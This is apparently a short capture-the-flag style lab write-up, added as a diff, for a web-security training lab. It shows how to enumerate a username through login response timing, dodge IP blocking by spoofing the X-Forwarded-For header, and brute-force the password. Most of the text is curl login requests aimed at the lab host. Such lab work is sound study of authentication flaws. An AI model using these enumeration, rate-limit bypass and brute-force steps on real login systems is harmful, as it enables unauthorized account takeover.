@@ -1,0 +1,23 @@
+
+
+This time we are focus on time to response
+if username is true then check password so need more time to check it
+and if my ip blocked use
+	"X-Forwarded-For: 85"
+header and change value to bypass that
+
+curl -ik -X $'POST' \
+    -b $'session=GXbKj35KYIx119PtnVTZyI6mb9xzdxiE' \
+    --data-binary $'username=applications&password=peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter' \
+    $'https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net/login'
+	
+this request have more response time than other response
+
+so start bruteforce password :
+
+curl -i -s -k -X $'POST' \
+    -b $'session=GXbKj35KYIx119PtnVTZyI6mb9xzdxiE' \
+    --data-binary $'username=applications&password=123qwe' \
+    $'https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net/login'
+	
+and we are in ;)
